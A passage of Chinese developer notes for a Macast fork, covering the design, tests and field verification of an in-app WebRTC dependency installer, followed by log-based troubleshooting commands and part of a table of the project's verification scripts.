| **清单是判决书，不是元数据** | `EXTRAS_MANIFEST_FIELDS`（`python`/`platform`/`machine`/`macast_version`/`files`）与 `EXTRAS_FILE_FIELDS`（`path`/`sha256`/`bytes`）各只有一个主人，写它的 `scripts/build_webrtc_extras.py` 调 `extras_manifest()` 现取 —— 于是"构建器写 `digest`、安装器问 `sha256"`这类漂移在结构上不存在。`check_manifest` **先问字段在不在**（一个 `KeyError` 到用户那里就只剩一句"安装失败"），**再问值对不对，且不匹配时两个值都必须念出来**（"这份包不是给你的机器"配半句话没人能行动）。字节数与 sha256 **双向**比对：清单列了包里没 → 拒；包里有清单没列 → 也拒（后一半防的是"构建器有 bug 或代理有想法"——落到 `sys.path` 上的每一个文件都必须在表上）。digest 的**格式**故意不校验：一个乱写的 sha256 会在跟真文件比对时失败，同样的答案、少一处会写错的地方 |
| **每一次拒绝都付在配置目录之外** | 五步 `download → verify → unpack → land → probe`，前四步全在 `_extras_tmpdir()`（**`SETTING_DIR` 下的 scratch，不是 `/tmp`** —— 与转码同一条理由：可能换卷、可能 noexec、也可能不是用户会去翻的地方）里跑完；解包**只写清单列出的成员**，`_extras_member_ok` 拒 `\`、`:`（Windows 盘符在 POSIX 的 `splitdrive` 之后就是普通文本，而这张表两边都要读）、前导 `/`、以及空/`.`/`..` 分段。**唯一带着文件留下的失败是 `probe`**：那时树已经在 ABI 位上了，用户需要的是真的 `ImportError`（缺系统库、架构不对）加上目录路径，而不是"什么都没发生" |
| **ABI 写进资产名，不靠清单去猜** | `EXTRAS_ASSET` 有**四个洞**（os / arch / cpython tag / 版本），所以一台错解释器的机器读到的是「这台机器（…）没有对应的依赖包」而不是 404（`extras_asset_name()` 回 `''` = 一次答复，不是一次崩溃）。`extras_abi(platform=, machine=)` 是 §4.8/Part 40 那条接缝——"有没有我的份"不许由**跑套件的那台 runner** 决定；而 `python` tag **故意不可覆写**，那是当前解释器加载得了什么，不是对别的解释器的陈述。落地目录 `SETTING_DIR/webrtc_extras/<os>-<arch>-<python>` 按 ABI 分键 ⇒ 同一台机器上两个 Macast 构建既不共享、也不互相拆台 |
| **挂 `sys.path` 是前置；换与删要先 forget** | `_extras_landing()` 逐字是 *"Put the tree on `sys.path` at the front, once, and remember where."* —— 前置是为了盖掉别处可能已有的同名包（一台 `pip install aiortc av` 过的源码机器装着旧版，就该用我们这份）。`_forget_webrtc_modules(under)` 是另一半：`sys.path` 改动对 `sys.modules` 已经服务的包毫无作用，不做这一步则"移除"之后卡片仍然声称可用，而**缓存就是原因**；它清 `_WEBRTC_MODULES` / `_WEBRTC_IMPORT_ERROR` / `_WEBRTC_VIEWER_CLASS`，逐名弹出根在 `_EXTRAS_MODULE_ROOTS`（`aiortc`、`av`）里的模块**以及任何 `__file__` 落在我们目录下的模块**（其余从我们树里加载的东西按路径找、不按名字），最后 `importlib.invalidate_caches()` —— §4.2「刚写进目录的那个 `.py`」在这里一样承重。**land 那一步在搬旧树之前就先 forget**：Windows 上一个还在使用的 `.pyd` 会让这次移动失败，而失败会记在我们正站着的那一步上 |
| **移除可恢复，而且不是我们种的树就不许动** | `_trash_extras_tree()` 走 `.trash/<时间戳>/`（与插件同一条规矩，§10「破坏性操作要可逆」），成功消息里带着新位置。目录不在但 `aiortc` 导入得起来 ⇒ **拒绝**，并念出它的 `__file__` 与「请用 `pip uninstall aiortc av` 卸载」——这一句的差别是"用户在撤销他按对的东西"还是"留下一份半拆的 Python 环境" |
| **进度搭 `mirror-state` 已有的轮询，下载在后台** | `start_extras_install()` 立刻答复并起一个 `MacastExtrasInstall` 守护线程 —— POST 不许为四十多 MB 的下载按住一个 CherryPy worker（与"发现不在 UI 线程"同一条规矩）。步骤机复用 `_SetupProgress`（done 步骤拒绝重入 ⇒ 进度条永不回退），快照就搭在卡片已经在做的轮询上：**与 BlackHole 那套不同，这里没有第二个本机页面**，因为这是一段短下载而卡片就站在旁边。失败除了卡片还要 `notify()` —— 一次下载跑得比一个开着设置页的人快，"安静地失败"正是音频安装器曾经读成"什么都没发生"的那形状 |
| **答案要落在卡片上，移除另起一步机** | `_SetupProgress.finish(ok, message)` 的第二个参数是这一轮加的：**在此之前页面读的那个 `message` 字段在成功收尾时仍是最后一步的标签**（「确认 aiortc 与 av 导入成功」），而真正的新闻（「已安装…（N 个文件）」/「已移除…，原来的文件在 <路径>」）只活在 `notify()` 那条一闪而过的通知里 —— §4.8 那条「这句话必须活在页面上而不只是一次性通知」对安装与移除**两个方向**都成立。移除走的是一条**自己的**两步机 `EXTRAS_REMOVE_STEPS`（`trash` / `unload`），不是复用安装的五步：在四十兆下载条下面做一次本地 `move` 就是「两处答案不一致比没有数字更糟」反过来读。`start_extras_uninstall()` 与安装共用 `_EXTRAS_BUSY` 那道闩，**正在装的时候按移除会当场拒绝**（「…等它跑完再看结果。」）—— land 那一步不是原子的，从它脚下把树搬走等于让 ABI 位拿着卡片刚承诺要收掉的东西。`_NullProgress` 是"没有页面"的那个同形替身，**签名必须跟着改**：这条这一轮是被套件自己抓住的（`uninstall_webrtc_extras()` 裸调用抛 `TypeError: takes 2 positional arguments but 3 were given`），所以 Part 60/C2 反过来把"这三个 extras 函数实际驱动的动词"用 AST 读出来，再要求两个类上**同名同签名**，不再靠"记得替身存在" |
| **页面不知道资产名、仓库地址与镜像前缀** | 「WebRTC 依赖」卡只说 `supported` / `ready` / `installed` / `packages` / 步骤；地址由 `plugin_repo` 拥有（`extras_urls()`：镜像在前、直连兜底、去重），`extras_describe()` == `{'packages','asset'}` 由 Part 60/A 按**全等**钉住。所以镜像开关自动作用于这一路，而"加前缀的规则"只有一处（§4.6） |
| **`requirements/*.txt` 里那两个名字留着，含义换了** | `common.txt` 与 `darwin.txt` 现在只声明**从源码跑**的那一路，外加 CI runner：`--ci` 那台机器要真的 `import` 得起 aiortc（Part 56/C 是客户端对打，声明一旦没了一条静默跳过）。Part 30 那条"macOS CI 装了 darwin.txt 点名的每一样"的比对**减去** `{norm(n) for n in plugin_repo.EXTRAS_PACKAGES}`（`verify_cast_airplay.py:12562`），而这个减法 keyed 在一个 Part 60/A 钉成**恰好两个名字**的元组上 —— 否则"往 `EXTRAS_PACKAGES` 里加一个名字"就是一条让这条检查不再提问的路 |
| **配额因此变紧** | 见 §4.3：四条 extras zip 每条实测 **26,884,928 字节**，且**骑在同一个门控的 `Upload artefact` 步骤**上（第五个上传步骤会把 §4.3 那笔账推回配额底下）。一次四平台构建 170 MB → **约 270 MB**，免费方案 500 MB ⇒ **两次构建就撞**，`Free artefact storage` 那个 job 从"礼貌"变成**承重**。普通 main push 仍然什么都不存（构建脚本照跑，所以上面那个尺寸是被量出来的而不是抄来的估计） |

回归用例 **Part 60（v0.20.0 落地时 68 条 → v0.21.0 实测执行 76 条 → v0.22.0 实测 78 条）**，按"这个事实住在哪一层"分四段（C2 是第五段，它测的是**卡片**；C3 是第六段，它测的是**那一格进度条自己**）：
A 段（6）问 `plugin_repo` 的坐标面
（`EXTRAS_PACKAGES` 恰好两个名字、资产名四个洞且每个参数都按序活下来、镜像开/关各自的地址表、
`plugin-info` 把命名规则交出去而不是页面自己抄）；B 段（22）问清单与判定（三键 ABI、
`platform=`/`machine=` 接缝 vs 不可覆写的 `python`、未知平台答"没有我的份"、四种字段不匹配各自
念出两个值、`version=` 接缝只在被告诉时答复、缺字段是拒绝而不是 `KeyError`、空 `files`、
缺 sha256/bytes、zip-slip 与反斜杠两种路径）；C 段（21）在**真临时目录**上走完整生命周期
（落地前 probe 真的说没有、装成功且五步都留痕、树在 ABI 目录、`sys.path` 前置、probe 自己翻面
且加载的是我们那一份、`extras_state()` 与 probe 一致、重装是替换不是合并且旧树进 `.trash`、
卸载后 probe 自己翻回未安装、卸载只是搬家、给错解释器被真拒绝、被拒之后目录里什么都没留下、
缺文件/散列不符/清单没列三种包形状各自的话）；**C2 段（这一轮的真浏览器验收逼出来的 9 条，v0.21.0 加到 12）**
—— C 段问的是函数自己的返回值，C2 只问**卡片**：走页面真正驱动的那条线程
（`start_extras_install`，不是裸 `install_webrtc_extras`）之后卡片留下的必须是**答案**而不是
最后一步的标签；在跑的装移除时被闩挡下并且**一个文件都不许动**（用例是**自己 set 那道闩**的，
因为假装能安排出一次真实的 land 竞态就是假用例）；移除的答案同样上卡片、带新位置与 ABI 目录名；
画自己的两步机且不出现安装那五步；`installed`/`ready` 一起答"否"；按第二次说「无需移除」并且
阶梯承认停在哪（一步 fail + 一步没跑到，不是一个绿色的"什么都没搬"）；加载中的模块不是我们种的
⇒ 念出它的 `__file__` 与 pip 那句（打桩 `_extras_module_origin`，`finally` 还原）；最后一条把
`_NullProgress` 的签名按**三个 extras 函数实际驱动的动词**（AST 现读）比对 `_SetupProgress`，
因为这一轮的 `TypeError` 正是"替身少一个参数"造成的；**v0.21.0 在这一段补的是「重启之后」**：
进程起来时没有任何东西把已经落盘的那棵树挂回 `sys.path`，所以按过一次按钮、下一次启动仍然读「未安装」。
三条分别问重启后真的挂回（挂在**第一次特征探测之前**）、**一个进程只问一次**（`_EXTRAS_PATH_RESTORED`
那道闩，三次探测只换来一次挂回 —— 否则每次轮询都在动 `sys.path`）、移除之后什么都不许挂回（槽位是空的，
这一步根本不跑）；**C3 段（v0.21.0 的 5 条 + v0.22.0 的 2 条 = 7 条）测的是那一格进度条自己**：3% 那个冻结值是**算出来的**（`sub(at, None, …)`
让 `overall()` 交出 `0.15 / len(EXTRAS_STEPS)`，用例钉的是这段算术而不是"看着像没动"）、下载那一步交出的
分数真的按字节涨到整份、服务器不说 `Content-Length` 时**不许编一个**（分数全 `None`，提示语丢掉
`/ 0.0 MB` 那半句）、body 比声明短 = 一次**拒绝**（点名下到多少、整份多少、重试整份重来、它试过的那个地址，
并且 ABI 落点什么都不留、阶梯停在 download 那一步），以及 body 干净收尾却不抛的另一种形状同样被拒 ——
这一格在真 `requests` 上会由 urllib3 抛 `IncompleteRead`，所以用例打桩的是 `requests` 的**模块属性**、
在 `finally` 还原，绝不在 `sys.modules` 里塞一份假 requests；D 段（10）问接线与页面（两个端点在表里且门是
`GATE_CODE`、在派生的落代码名单里、不在 `CONSOLE_ACTIONS` 里且 `console_action` 拒绝、页面 POST
两个字段（Part 51 的页面↔表对齐因此不空转）、页面不硬编码资产名或地址、源码机那句提示同时点名
按钮与 pip 行、**帮助弹层与卡片说同一句话**（§4.13：能力也要问两遍，绑定
`EXTRAS_INSTALL_LABEL`）、`'extras'` 是页面认得的一张卡，且 `SECTION_ORDER` 与页面里 `sec === '…'`
的**两侧**排在同一个槽位）。另有一条老用例被**翻面**：Part 56/D 原来钉的是"这两包在四处打包配置里
一处不能少"，现在钉的是"默认产物里不再携带"。

**诚实边界（2026-10-05 第三次更新）**：CI **已经**把四条 extras 资产随 v0.20.0 的 Release 发出来了
（Release 共 8 个资产 = 4 个平台产物 + 4 条 extras zip，各自带 `digest`；构建脚本在四个 job 里
仍是 ungated 跑的，所以上面那个尺寸是被量出来的而不是抄来的估计）。"别人拉得到吗"与"按一次按钮
装不装得上"这两问也都有了答案，见下面两段。**这一节原来欠的两处真机验收，2026-10-05 都走完了**：
① **本机换成 v0.21.0 的打包 `.app` 之后真的按了一次「一键安装」，而且跑完了** —— 卡片答案落在
「已安装 WebRTC 依赖（1075 个文件）」，`ready` 与 `installed` 一起翻真，`running` 落回 `false`，
ABI 位 1,076 个文件 / 68 MB。就是这一趟在卡片上看见**进度条从 3% 倒退到 0%**，于是有了本节缺陷第 4 条。
② **`.68`（Windows）装了带 extras 的版本并重跑了跨机 WebRTC** —— 宿主升到 v0.21.0、extras 树字节未动、
卡片自己翻成 `ready` / `installed` 为真，然后一次真跨机镜像：`.68` 用 ddagrab + NVENC 采集，
本机 chrome-headless-shell 观看，协商 `video/H264 pt=99`、25 个解码帧、抓帧亮度均值 69（真画面不是全黑）、
发送端 `clients=1 sent=1.9 MB drops=139 misses=0`，端到端探针判定 PASS。验收之后镜像已停、
他的 `Mirror_*` 逐值还原。这一趟的代价（**我把他的设置清空过一次**）记在 §4.2
「读不懂的设置文件必须整份搬开」那一条，而不是这里。

**2026-10-05 又走了一趟 v0.22.0，这一趟带回来三件事**（前两件事的验收现场是**临时配置目录 + 58995 的打包形状仿真实例**，
用户 58880 上那个实例与他的真实配置一个字节没动）：

- **双机换包读数**：本机 `/Applications/Macast.app` 与 `.68` 都升到 v0.22.0，四条产物的 `sha256` 与 Release
  自己的 `digest` 逐字节对上。本机换包后配置 **36 键 → 36 键、`changed_keys []`**；`.68` 的配置
  `BYTE-IDENTICAL=True`（sha8 `6a6613a5`）、extras 树 **1083 个文件 / 90,950,053 字节**未动、
  `/api?query=status` 回 0.22.0、卡片三个见证者 `supported/ready/installed = True/True/True`。
  **换包要重勾屏幕录制授权那一格照旧**（§8），本机这一按还没做，所以本机当前的镜像状态是「未验收」而不是「坏了」。
- **缺陷第 4 条（单调钳）的真实跑证到手**：这一趟**故意**让下载断流，好让钳在真机上被看见。616 个 0.25 秒采样、
  158.90 秒、**overall 零回退**、取值集合恰好 `{0.129684, 0.2}`。那个 12.9684% 可复算：
  `0.129684 × 5 步 = 0.64842`，乘 25.6 MB = **16.6 MB** = **第一次尝试 stall 时的历史最大值**，
  而第二次尝试自己的**未钳**轨迹只有 3.3%–5.9%（步内比例 first 0.16576 → max 0.29496）。
  也就是说：断流整份重来时，卡片钉在 12.97% 而不是退回 3.3% —— 这一格从前的证据只有单元测试，现在有真实网络的那一份。
  终局的失败句（`running=False`、pct 0.2、「依赖包没下载下来」）同时是 v0.22.0「中断必须有明确答复」的真机证据。
- **`_restore_extras_path()` 在真机上翻了面**：run 2 把树落进 ABI 位之后，修好仪器**直接重启实例**，
  卡片就自己读成 `ready/installed = True/True`，**没有重新下载那二十六兆**。这正是那条函数存在的理由
  （"按一次按钮管一次进程"→ 现在管到下一次启动），在这一趟之前它只有单元测试。
- **两个验收仪器自己的 bug，都长得像产品缺陷，都要留在这里**（§4.2「测试自己的实现也是实现」那一族，
  这次抄的是**我自己的拦截器和采样器**）：
  ① `meta_path` 拦截器把顶层 import 的 `path=None` 读成「不是我们的树」⇒ **刚落盘的那一份也被判成外来的**，
  卡片于是印出「依赖包已落盘，现在还导入不了」——一句完全诚实的谎。修法是去问真的
  `importlib.machinery.PathFinder`，拿它**实际解析到的 `spec.origin`** 判归属，而不是猜父包；
  ② 采样器用 `e['done']` 当退出条件，而 POST 落地前读到的仍是**上一场的终态** ⇒ 采了一行就退出，
  `dense2.csv` 只有 1 行。**所以这一趟的 durable 证据是 run 1 的 `dense.csv` + 上面那段算术**，
  不是 run 2 的 CSV。
- **`ghproxy.net` 单连接的真实节奏**（比 §4.6 那句「约 0.7 MB/min」更细）：前 20 秒约 4.6 MB 突发，
  随后掉到约 2–3 MB/min，且**会在中途断流** —— 这一趟 run 1 stall 在 16.6 MB、第二次在 7.6 MB 处
  `ConnectionError`；前一天跑满 26.9 MB 的那一趟属于运气好的一端。产品侧**故意不续传**
  （`_fetch_extras_zip`），所以用户听到的就是那一句「没下载下来」＋整份重来，这与上面那条单调钳是同一件事的两半。

**页面这一半在 2026-10-04 走过了**（临时配置目录 + 58997 的第二个实例，用 `meta_path` 拦截器把
这台 venv 里真实存在的 `aiortc`/`av` 藏起来，好让卡片读到的就是打包产物上那个状态）：
28 项判定全过、零红、页面**没有任何 JS 报错**，520 / 1000 / 1680 三档各留了初始与已落盘两张截图。
走过的是三条路，每条都拿**卡片上渲染出来的字**当判据：① 按「一键安装」，在**那一趟跑的时候资产还没挂上
Release**（tag 之前），所以**必须**听到一句实话 —— 「下载依赖包失败：依赖包没下载下来（<那条 Release
地址>）。检查一下网络，或者在设置页开启国内镜像。」，同时 `running` 落回 `false`、按钮重新可点、阶梯留着、
scratch 目录清空（**那句失败在当时是正确行为**，它不是待修的缺陷；今天同一条路只有在镜像与直链**都**拉不通
时才该出现）；
② 手工把构建出来的包放进 ABI 位、解释器仍然导入不了 ⇒ 卡片必须把**两个见证者的分歧**印出来
（「依赖包已落盘，现在还导入不了」）并同时给两个按钮；③ 按「移除」，答案落在卡片上、
点名 `.trash` 里的新位置与 ABI 目录名、两步阶梯、槽位清空、树仍可恢复、回到只有一个按钮。
**"一次成功的安装"也在 2026-10-04 补上了，而且用的是发布出去的那份字节**：CI 随 v0.20.0 发出四条
extras 资产之后，`ghproxy.net` 前缀那条地址在本机跑满 **26,884,399 字节**，`shasum -a 256` 与 Release
自己的 `digest`（`085e322c…21ff6018`）**逐字一致**（同一台机器上**直链回 0 字节 / curl 000**，
所以这条实测同时回答了"镜像代理 Release 资产到底行不行"—— **行，代价约 0.7 MB/min**，
别把它读成加速。**续传是探针 `-C -` 的手，不是产品的**：`_fetch_extras_zip` 故意不续传，
断流时用户听到的是一句「没下载下来」＋整份重来）。那份文件原样喂进同一个打包形状仿真实例（临时配置目录 + 58999 + `meta_path`
只允许从落盘树导入），走产品自己的安装器：五步 **全绿**，卡片答案「已安装 WebRTC 依赖（1075 个文件）」，
`ready` 与 `installed` 一起翻真，ABI 位 1,076 个文件；再按「移除」⇒ 答案点名
`.trash/20261004-204506/macos-arm64-cp312`、两个见证者翻回否、树可恢复。**双 PASS**。
一句方向别读错：`ready` 只能由这份包自己满足（拦截器对 11 个根名一律抛 `ImportError`，除非
`spec.origin` 在那棵树里），所以绿证明的是 **CI 那份内容完整**，不是仿真放水。
构建事实一条：CI 那份 macos 资产 **26,884,399** 字节、本地构建那份 26,884,928 —— 两个数都真，
也都**不该**拿来互相核对，因为校验对象是清单与逐文件 sha256，不是跨构建的字节同一性。
**那两处真机欠账已在 2026-10-05 清掉**（本机打包 `.app` = v0.21.0 按了一次安装；`.68` 装了一次并重跑跨机
WebRTC；读数都在本节第一段的「诚实边界」里）。留在这里的一句是**往前看**而不是欠账：换包会**再要一次
屏幕录制授权**（§8），所以任何"装了新产物就报镜像坏了"的判断都要先问这一格。
另记一句设计本身而不是缺陷：源码跑的机器上 `ready` 为真，卡片那句提示**故意**同时点名按钮与
`pip install aiortc av` 那一行（Part 60/D 钉住"两个都在"），因为这类机器本来就已经装着这两个包。

## 5. 排障手法（比读代码快）

```shell
LOG="$HOME/Library/Application Support/Macast/macast.log"
grep -aE "Cast LOAD|Cast connection|Cast handshake|Chromecast|AirPlay|mDNS|ERROR|Traceback" "$LOG" | tail -60
```

- **"有声音没画面"的第一判据是 `video-reconfig`**：mpv 只在配置视频轨时发这个事件，
  而 MPVRenderer 把 mpv 事件原样写日志。只有 `audio-reconfig` ⇒ 流里没有视频轨（发送端问题）：

  ```shell
  grep -aE "video-reconfig|audio-reconfig|file-loaded|end-file" "$LOG" | tail -30
  ```

- **`Cast LOAD ... contentType=...`** 记录发送端自称要推什么。`audio/*` 就是实锤。
- **问 mpv 到底拿到了什么轨**：从 `pgrep -fl mpv` 取 `--input-ipc-server=` 路径，发 IPC
  `get_property`：`track-list` / `video-codec` / `width` / `height` / `current-vo` / `core-idle`。
  ⚠️ 返回 `{"error":"success"}` 是**成功**，别当失败处理。**而且一次批量读取要按 `request_id`
  是否凑齐来终止**：空闲播放器上 `media-title` / `filename` / `duration` / `time-pos` 回的是
  `{"error":"property unavailable"}`（`force-media-title` 却回 `''` + `success`），
  所以拿 `error == 'success'` 当筛条件就永远凑不齐，套接字直接超时（2026-10-05 实测，见 §4.2
  「改播放器的地址，就必须改播放器的名字」末）。同理「在不在播」要**等 `time-pos` 变成一个数**，
  别抓一瞬间的 `duration`。
- **别把"端口在听"当证据**：`lsof ... LISTEN` + `socket.connect()` 成功都**不能**说明有人
  `accept()`。要区分就真的做一次 TLS 握手。
- **环境里有代理会让本地网络测试假失败**：
  `env -u http_proxy -u HTTP_PROXY -u https_proxy -u HTTPS_PROXY <cmd>`。
- **仓库可见性要**测**，不要引文档 —— 本仓库在这上面错过两次，方向相反**（第一次是本会话把 404 读成"沙箱不通"，
  三条互相独立的探针才定性成"私有"；第二次是 2026-10-04 写着"私有"却发现已经不是了）。
  **2026-10-04 实测：`pingod/Macast` 现在是公开的。** 四条匿名证据：
  `https://api.github.com/repos/pingod/Macast` → **200**（`private: false`、`visibility: "public"`），
  匿名 `…/releases/tags/v0.19.0` → **200**，`https://data.jsdelivr.com/v1/packages/gh/pingod/Macast` → **200**，
  以及对 v0.19.0 那个资产发一次**不带任何凭据**的 `Range: bytes=0-1023` → **206 / 1024 字节**；
  `scripts/check_index_reachability.py` 同一趟报 **`INDEX_OK`（退出码 0）**。
  **它改变了什么**：P9 那条新通道（§4.15 的 extras zip）是**别人真的装得到的** —— 一个 Release 资产、
  应用内一个按钮、匿名可读；设置页与文案不必再为"注定 404"写道歉。**它没改变什么**：
  `plugins/info.json` 是**空索引**（15 个第一方插件全内置，§4.8），所以第一方用户体验本来就与可见性无关。
  **当初的实测（2026-09-21，写在这里是因为它定义了那批文案的形状）**：`gh api repos/pingod/Macast --jq .private`
  → **true**；匿名 API **404**，而同一请求打公开的上游 `xfangfang/Macast` → **200**；jsDelivr 元数据
  → **404 "Couldn't fetch versions"`（公开上游回 200 带版本表）。当时 9 个固定链接只有 5 个还回 200 ——
  那是 CDN 在仓库还可读时缓存下来的副本。`raw.githubusercontent.com` 在这台机器上是 `000`（只有这个 host 被挡），
  **这正是当初把 404 读成"沙箱不通"的原因** —— 判 Reachability 要用上面那几条带**公开对照组**的探针，
  或者直接跑 `scripts/selfcheck.py` 的「=== online plugin index ===」段 / `scripts/check_index_reachability.py`。
  **决策（2026-09-22 接「将所有插件都内置吧」更新）**：原"保持私有、官方只承诺手动安装"
  的约束适用范围从"全部插件"缩小为"第三方/用户自建插件"—— 空 `plugins/info.json` 与
  设置页「从网址安装」/ 把 `.py` 放进 `~/Library/Application Support/Macast/renderer/`
  （协议插件放 `protocol/`）的入口**保留**，作为第三方插件的手动安装通道。**不要再提
  "改公开 / 另立公开仓库"**，那是已经回答过的选项；而且今天这一半已经是既成事实 —— 看到设置与决定不一致时
  **报告现状**给所有者，别自己去动仓库设置（那是他的账户；详见 §4.6）。
  推送仍然走 `git push git@github.com:pingod/Macast.git main`，推完
  `git update-ref refs/remotes/origin/main <sha>` 让本地 origin 对上。
- **WorkBuddy/CLI 沙箱**：`PYTHONPATH` 被注入 shim，`mkdir(exist_ok=True)` 会抛
  `PermissionError: EEXIST`；`ps` 不可用。一律 `env -u PYTHONPATH`，用 `lsof`/`pgrep` 代替 `ps`。

## 6. scripts/ 里的工具

| 脚本 | 用途 |
|---|---|
| `run-from-source.sh` | 从源码启动（会 unset PYTHONPATH） |
| `verify_cast_airplay.py` | **主验证套件**（2026-09-25 本机实测 1713/1719 通过、`--ci` 同一趟在 Linux 容器里 1708/1714；2026-10-01 本机 1761/1767（总数差是环境计数的用例，红的 6 条每次同一批），红的 6 条都是 Part 34 —— 见 §4.12 末条；2026-10-02 本机 1881/1887；2026-10-03 本机 1963/1969、2010/2016 与 2012/2018（同一批 6 条 Part 34 红），当日到 v0.26 的 2033/2039 与应用 v0.18.0「网页地址投屏」的 2172/2178（Part 59 132 条 + Part 44 新增 7 条绑定）、2026-10-04 应用 v0.19.0 的 2229/2235（Part 59 174 条 + Part 36 新增 13 条菜单栏用例；这一趟在写文档时抓到 cookie 台账外的真 bug —— 见 §4.14 的「`#HttpOnly_`」那一行）；同日 tag 构建的那个 Linux runner 首跑 1813/1822 且 `--ci` 拒绝 —— 红的三条是 Part 52 的 argv 用例漏了平台钉（那个 job 该抓的东西，修法见本行末 Part 52；修后同 runner 复跑 1816/1822 且 `--ci` 通过）；**这套件现在真的在 CI 里跑**：`build.yml` 的 `verify` job（ubuntu-22.04、headless、`--ci`），`release` 等它 —— 见本行末的 Part 50；它随数据规模伸缩：索引清空后，按条目循环的那些用例
不再产出，v0.7.15 时的 1121 条里含有 9 个索引条目各自的用例）：协议逻辑 + 真实 socket 端到端 + mDNS/网卡/插件热插拔 + 内置插件加载 + 插件索引/条目与清单一致性 + 国内镜像开关（Part 5c/7/12）+ 网页投屏入口与令牌门控 + 9 个内置插件（下载器/外部播放器/小窗/钩子/中继/RAOP/屏幕镜像/本地文件投屏/AirPlay 镜像接收）+ Cast 接收端一致性（Part 18）与 8443 HTTPS setup API（Part 19）+ 日志轮转/尾部读取/清空（Part 20）+ 屏幕镜像发送端（Part 21 假 ffmpeg 对打自家 Cast 接收端；Part 22 浏览器目标与采集预设；Part 23 DLNA 电视＝伪装成文件 + 用自家接收端校验 SOAP；Part 24 Cast Streaming 低延迟通道＝自家假设备对打（真 TLS + 真 UDP）；Part 29 一键设置修复 + 分步进度页 + v0.9 的五态判定（盘上有驱动就不再下载、不再开安装器；CoreAudio 有而 ffmpeg 没有 ⇒ 麦克风权限而不是重装））+ 本地文件投屏（Part 25 ffprobe 决策表 + Range/206 服务 + 假 Cast 设备与自家接收端 + DLNA 发送序列）+ 按模块独立日志（Part 27）+ 模块设置面板与归属漂移守卫（Part 28）+ AirPlay 镜像接收（Part 26 假 uxplay 走完生命周期）+ 内置插件的 import 允许面（Part 30：只允许 Macast 自己声明过的包；pyobjc 那条已定性）+ 采集设备探测的输入形状（Part 31：真机 `ffmpeg -list_devices` 逐字输出喂解析器，并扫测试文件自己，不许再出现虚构的带引号无索引设备行）+ 自检脚本与插件的一致性（Part 32：读 `selfcheck.py` 的文本要求它和两个发送端插件**说的是同一套编码器 / 同一批查找目录 / 同一个 mDNS 与 SSDP 目标 / 只读不写用户设置**）+ **端到端冒烟脚本与应用的耦合**（Part 33：`e2e_smoke.py` 是唯一跑真应用的检查，而它的隔离性全靠**字符串**——端口的设置键名、appdirs 打桩、只开 DLNA 的协议表、代理变量名单、它问的 `/api?query=` 键名、`get_status` 的 server 键名。应用侧改个名就会让这些**静默失效**，冒烟照样全绿。所以逐条拿应用源码比对这些字符串，并守住" BOOTSTRAP 里 `import macast` 之前先打桩""不出现 `Setting.set(`""退出码由失败数决定"。这一 Part 是纯文本检查，从不 import 那个脚本）+ **来源与署名**（Part 34：`git blame` 按 fork 点把每个 `.py` 数成 upstream/vendored/mixed/ours 四态，双向守声明 —— 上游行还在就不许没有上游归属，一行都不是我们的就不许有我们的，`macast/ssdp.py` 里那层 MIT 作者群不许消失；再比 `docs/Provenance.md` 的台账行与两张表的数字；并把 `provenance.py` 当模块导入，用合成行证明"删掉上游声明＝报红""最后一行上游代码被重写完＝不再要求上游归属"这两个方向都测得出，另加"插入点必须留在插件清单块内"+ 用**自家解析器**验盖过名的插件仍被识别。三个变异体（删 `protocol.py` 上游头 / 给 `web.py` 盖我们的头 / 删 ssdp 的 MIT 块）逐个验过，各自必红）+ **镜像控制台与实时链路**（Part 35 页面读的端点、`mirror_view.py` 的派生规则、页面与后端共享的拼写；Part 36 菜单栏自己的内容，含"不许出现电脑投屏行"这条用户裁定；Part 37 实时链路的算术 —— 队列的秒预算、丢弃切在容器边界、DLNA 预填的秒数、没动过设置时 `auto` 选哪个编码器；Part 38 采集开了却一帧不返回 —— 挡掉"正常采集也会打"的运行时噪声、弃掉读不到的音频口重起一次、每一条"没有返回画面"都必须给出门与重启、弃声的会话在页面上不再被那一行「已启用」谎称有声音；Part 39 Windows 系统声音的真实设备表 + 一条 M-SEARCH 到底出不出本机 + 延迟预算 + 真 TCP socket 上的 Nagle 修复；Part 40 只有**打包后的** Windows 才教得了的三件事（首帧预算杀死了声音口已谈拢的采集、把 Windows 用户送去 macOS 的麦克风面板、`cheroot.ssl` 没进包 —— §4.3 那一族）；**Part 40 另管 `_audio_line` 的 `platform` 接缝在三条「未启用」分支上真的生效**（在 Linux runner 上问 `platform='win32'` 必须拿到 Windows 那句 —— 曾经读到的是 `sys.platform`，于是"该去哪个系统面板"随跑代码的机器变），**Linux 的那一句必须给出门**（`PULSE_DOOR`：`pactl get-default-sink` 问得出默认输出设备、装 `pulseaudio-utils`、点「重新探测采集」，只报"需要 PulseAudio"不算答案），**`_default_pulse_monitor` 必须把「pactl 根本不在」与「pactl 说不出 sink」两种原因留在日志里**（`logger.debug`，探测是缓存的、不在热路径）；三个变异体各自变红：改回 `sys.platform` ⇒ 2 条、删掉两条 debug ⇒ 1 条、把 `PULSE_DOOR` 压回原来那一句 ⇒ 2 条；Part 41 `.exe` 不许弹控制台窗口（`--noconsole` 与每个子进程的 no-window 标志缺一不可，还有 windowed 进程根本没有 `stdout`）；Part 42 真 TCL 85T8G「下载了 26 MB 却仍然不播」⇒ 响应必须带上 DIDL 承诺的 `DLNA.ORG_PN`、一次交换要落在**用户真会留的日志**里且不能被重试刷爆、对端关掉的连接要认出自己这一半的 CLOSE_WAIT；Part 43 第二个观看端加入实时 Matroska —— 输入是**真编码器管道**产出的 `scripts/fixtures/live-mkv-h264.bin`，元素树在下面用**另一个**解析器重读一遍，免得 fixture 与实现共谋；**Part 44 设置页「帮助」弹层与页宽（见 §4.13）—— 弹层里每一句可核对的陈述都被要求由决定它的那段代码回答**：端口问 `cast.CAST_PORT` / `airplay.AIRPLAY_PORT`、HTTPS 问 `utils.py` 的 +1、配置目录问 `user_config_dir('Macast', 'xfangfang')`、镜像目标与「哪条没有声音」逐 bullet 比对 `screen_mirror.OUTPUTS`、低延迟上限比对 `CAST_STREAM_MAX_BITRATE`、DLNA 档位与预填秒数比对 `DLNA_PROFILES` / `DLNA_PREFILL_SECONDS`、无帧超时比对 `NO_FRAME_SECONDS`、字幕扩展名比对 `protocol.py` 的 `sub_exts`、日志上限比对 `RotatingFileHandler` 的 `maxBytes`/`backupCount`、标签页列表比对页面里的 `el-tab-pane`；页宽一侧则守 `box-sizing`、`min(1680px,100%)`、`.pane-duo` 用 `auto-fit`（两张卡的行不许在宽屏留半页空白）、以及弹层自带 `background: var(--panel)` + `color: var(--text)`（深色模式白底压白字）；**Part 46 CI 的 Actions 存储配额（见 §4.3）—— 四个 `Upload artefact` 